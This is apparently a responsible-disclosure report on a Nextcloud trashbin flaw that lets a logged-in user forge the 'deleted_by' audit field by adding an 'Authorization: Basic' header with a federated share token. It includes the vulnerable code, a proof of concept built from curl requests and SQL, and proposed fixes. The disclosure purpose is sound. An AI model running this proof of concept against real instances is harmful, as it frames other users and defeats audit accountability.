# Trashbin: any authenticated user can forge the `deleted_by` audit field by injecting an `Authorization: Basic` header alongside their session cookie

## Summary

`apps/files_trashbin/lib/Trashbin.php::overwriteDeletedBy()` reads `$_SERVER['PHP_AUTH_USER']` and, when the value matches the `token` column of any `oc_share` row of type `TYPE_REMOTE` / `TYPE_REMOTE_GROUP`, writes that row's `share_with` value into `oc_files_trash.deleted_by` instead of the actual deleting user. The function never checks that the request was actually authenticated via the federated-share `Authorization: Basic` mechanism — it just reads the header. The Sabre WebDAV auth path (`apps/dav/lib/Connector/Sabre/Auth.php:190`) explicitly accepts a session-cookie-only login when `DAV_AUTHENTICATED` is unset, so any logged-in user can attach an arbitrary `Authorization: Basic <base64(<known_federated_token>:x)>` header to a WebDAV `DELETE` and the deletion's audit row will be attributed to the share's `share_with` value rather than to themselves.

## Vulnerability Details

- **Vulnerability Type:** Improper authentication of the source value used in audit log writes (CWE-345 — Insufficient Verification of Data Authenticity; CWE-117 — Improper Output Neutralization for Logs as secondary).
- **CVSS 3.1 Score:** 4.3 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`.
- **Affected component:** `apps/files_trashbin/lib/Trashbin.php` (`overwriteDeletedBy`, `move2trash`).
- **Verified version:** Nextcloud Server 34.0.0 (build 34.0.0.12) running the official `nextcloud:latest` Docker image on 2026-06-21. The vulnerable function exists unchanged on `master`.
- **Affected endpoint (one of several that trigger `moveToTrash`):** `DELETE /remote.php/dav/files/<user>/<path>`.

### Vulnerable code

`apps/files_trashbin/lib/Trashbin.php:1250-1267`:

```php
private static function overwriteDeletedBy(string $user) {
    try {
        $request = Server::get(IRequest::class);
        /** @psalm-suppress NoInterfaceProperties */
        $token = $request->server['PHP_AUTH_USER'] ?? '';   // <-- raw header, not validated
        if ($token === '') {
            return $user;
        }

        $federatedShareProvider = Server::get(FederatedShareProvider::class);
        $share = $federatedShareProvider->getShareByToken($token);   // <-- DB lookup on attacker-supplied value

        return $share->getSharedWith();                              // <-- attacker-chosen attribution
    } catch (NotFoundExceptionInterface|ContainerExceptionInterface|ShareNotFound) {
    }

    return $user;
}
```

Reached from `apps/files_trashbin/lib/Trashbin.php:305` inside `move2trash()`:

```php
$deletedBy = self::overwriteDeletedBy($user);
$query = Server::get(IDBConnection::class)->getQueryBuilder();
$query->insert('files_trash')
    ->setValue('id',         $query->createNamedParameter($filename))
    ->setValue('timestamp',  $query->createNamedParameter($timestamp))
    ->setValue('location',   $query->createNamedParameter($location))
    ->setValue('user',       $query->createNamedParameter($owner))
    ->setValue('deleted_by', $query->createNamedParameter($deletedBy));   // <-- audit row written
$query->executeStatement();
```

The Sabre WebDAV auth branch that allows the `Authorization` header to be present *without* gating on it — `apps/dav/lib/Connector/Sabre/Auth.php:188-200`:

```php
if (
    //Fix for broken webdav clients
    ($this->userSession->isLoggedIn() && is_null($this->session->get(self::DAV_AUTHENTICATED)))
    //Well behaved clients that only send the cookie are allowed
    || ($this->userSession->isLoggedIn() && $this->session->get(self::DAV_AUTHENTICATED) === $this->userSession->getUser()->getUID() && empty($request->getHeader('Authorization')))
    || \OC_User::handleApacheAuth()
) {
    $user = $this->userSession->getUser()->getUID();
    ...
    return [true, $this->principalPrefix . $user];
}
```

The first branch returns success on cookie auth with `DAV_AUTHENTICATED` unset, regardless of what `Authorization` header is present. The second branch explicitly requires `empty($request->getHeader('Authorization'))`, but it is OR-ed with the first, so the first branch wins on the first DAV request of a fresh session. PHP's automatic parsing of the `Authorization: Basic` header into `$_SERVER['PHP_AUTH_USER']` happens regardless of which branch matches.

## Steps to Reproduce

**Setup**

- Nextcloud Server 34.0.0 (official `nextcloud:latest` image) reachable at `http://127.0.0.1:31666`.
- Local user `alice` (password `alice_pw_31666`), no special privileges or roles.
- At least one row in `oc_share` whose `share_type` is `6` (`TYPE_REMOTE`) and whose `token` is known to the attacker. The fastest path in a controlled environment is direct DB injection; on a production instance the attacker reaches the same state by initiating a federated outgoing share to a server they control and reading the token off the resulting row (the share-creation flow generates a random token before the remote handshake). For this PoC the row is injected directly to keep the report self-contained:

```sql
INSERT INTO oc_share
    (share_type, share_with, uid_owner, uid_initiator, item_type, item_source,
     permissions, stime, token, attributes)
VALUES
    (6, 'bob', 'alice', 'alice', 'file', '0', 31,
     UNIX_TIMESTAMP(), 'SPOOFTOKEN12345', '[]');
```

`share_with` is the identity the attacker wants the deletion attributed to. In the real-world variant (federated outgoing share against an attacker-controlled peer) the attacker chooses the federated cloud-ID handed to that share.

**Reproduction**

1. Log in as `alice` and obtain a session cookie. Any normal login flow works; in the lab I posted to `/login` with `Origin: http://127.0.0.1:31666` and the `requesttoken` value scraped from `GET /login`:

```bash
JAR=alice.jar
RT=$(curl -sS -c $JAR http://127.0.0.1:31666/login \
       | grep -oE 'data-requesttoken="[^"]+"' | head -1 | cut -d'"' -f2)

curl -sS -b $JAR -c $JAR -X POST http://127.0.0.1:31666/login \
     -H "Origin: http://127.0.0.1:31666" \
     -H "requesttoken: $RT" \
     --data-urlencode "user=alice" \
     --data-urlencode "password=alice_pw_31666" \
     --data-urlencode "requesttoken=$RT" \
     -o /dev/null -w "%{http_code} -> %{redirect_url}\n"
# 303 -> http://127.0.0.1:31666/apps/dashboard/
```

2. As `alice`, `PUT` a victim file via WebDAV using the same cookie session:

```bash
curl -sS -b $JAR -X PUT \
     http://127.0.0.1:31666/remote.php/dav/files/alice/spoofvictim.txt \
     -H "User-Agent: Mozilla/5.0 (Linux) mirall/3.10.0" \
     -H "requesttoken: $RT" \
     --data-binary 'forensic-bait'
# HTTP 201
```

3. `DELETE` the file with the same session cookie **plus** an injected `Authorization: Basic <base64(<token>:x)>` header:

```bash
SPOOF=$(printf 'SPOOFTOKEN12345:x' | base64 -w0)   # U1BPT0ZUT0tFTjEyMzQ1Ong=

curl -sS -b $JAR -X DELETE \
     http://127.0.0.1:31666/remote.php/dav/files/alice/spoofvictim.txt \
     -H "User-Agent: Mozilla/5.0 (Linux) mirall/3.10.0" \
     -H "Authorization: Basic $SPOOF" \
     -H "requesttoken: $RT"
# HTTP 204
```

4. Inspect the trashbin audit row:

```sql
SELECT id, user, deleted_by FROM oc_files_trash
 WHERE user='alice' ORDER BY timestamp DESC LIMIT 1;
```

**Observed result:**

```
id              | user  | deleted_by
spoofvictim.txt | alice | bob
```

All other historical deletions by alice in the same table show `deleted_by = 'alice'`, isolating the spoof to this single request. The session cookie authenticated the request as alice; the audit attribution was rerouted to `bob` purely because the `Authorization` header was parsed by PHP into `$_SERVER['PHP_AUTH_USER']`.

## Impact

`oc_files_trash.deleted_by` is the canonical audit field for "who deleted this file" inside Nextcloud. It is read by:

- the Trashbin web UI (shows "deleted by X" for shared-folder items),
- the Activity app (entries for `file_deleted` reflect this value),
- any downstream audit / SIEM pipeline that ingests Nextcloud's activity stream or queries the database for forensics.

Because the attacker freely chooses the spoofed identity (any `share_with` value present on an `oc_share` row of `share_type` 4 or 6 whose token they know), the bug enables:

1. **Framing other users.** In a folder shared between alice and a coworker, alice deletes a sensitive file and attributes the deletion to that coworker. The shared-folder owner sees the coworker as the deleter and pursues remediation against the wrong party.
2. **Audit-log evasion / self-attribution removal.** Alice marks her own deletions with a non-existent or unrelated identity, breaking the chain of custody during incident response.
3. **Compliance integrity loss.** Organisations running Nextcloud under HIPAA / GDPR / SOX retention rules rely on `deleted_by` for accountability. A user with a session can silently invalidate that record on every deletion they perform.

What the bug does **not** do, called out explicitly so the triager does not over- or under-rate it:

- It does not let alice read, modify, or delete files owned by other users.
- It does not grant any privilege she would not have otherwise.
- It does not bypass authentication — alice still has to be logged in as herself.
- It only affects rows where `oc_files_trash.user = <attacker uid>`, i.e. her own trashbin.

So the impact is purely audit-data integrity, but it is persistent, deterministic, and triggered by a single extra header per deletion. CVSS 3.1 reflects that: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N = 4.3 Medium`.

## Recommended Fix

The intended use of `PHP_AUTH_USER` here is to detect "a federated peer is invoking this delete on behalf of one of its users using the federated-share token as its basic-auth username" — i.e. the request was actually authenticated by the federated-share `AbstractBasic` backend using that token. The check should therefore be a *post-auth* property of the authenticated session, not a re-read of the raw header.

A targeted fix is to consult the authenticated user / login-credentials object rather than the header, e.g.:

```php
private static function overwriteDeletedBy(string $user) {
    try {
        $loginCredentials = Server::get(\OC\Authentication\LoginCredentials\IStore::class)
                              ->getLoginCredentials();
        // Only honour the federated-share attribution when the session was actually
        // established via the federated-share Basic auth backend, not just because a
        // Basic header happened to be present in the request.
        if (!$loginCredentials->isAuthenticatedByFederatedShareToken()) {
            return $user;
        }
        $token = $loginCredentials->getFederatedShareToken();
        $share = Server::get(FederatedShareProvider::class)->getShareByToken($token);
        return $share->getSharedWith();
    } catch (\Throwable) {
        return $user;
    }
}
```

If a "did the federated-share backend succeed for this request" signal does not already exist on `IUserSession` / `IStore`, a one-bit value set by the federated-share auth backend on successful login (and read here) is enough.

A narrower interim mitigation that preserves the original feature: only honour the override when no other authenticated user-session UID exists, or when it matches the share's `share_with`:

```php
$authenticatedUid = Server::get(IUserSession::class)->getUser()?->getUID();
if ($authenticatedUid !== null && $authenticatedUid !== $share->getSharedWith()) {
    return $user;
}
```

Either fix closes the spoof while keeping legitimate federated-peer attribution working.

## Supporting Materials

- Verified version: Nextcloud Server **34.0.0.12** (official `nextcloud:latest` image, captured 2026-06-21).
- All requests / responses above were captured against a freshly installed instance in a local lab. No production data was touched.
- Test accounts (`alice`, `bob`) and the injected `oc_share` row are all created in the lab; no real federated peer was contacted during testing. The DB injection is used to keep the PoC self-contained; the same condition is reachable on a real instance by initiating a federated outgoing share to an attacker-controlled peer.

## Disclosure notes

Reporting via HackerOne per `https://hackerone.com/nextcloud` and the AI-contribution policy in `AGENTS.md`. The PoC and verification were independently re-run by the human submitter against the same image before submission. No mass exploitation, scanning, or off-target probing was performed.
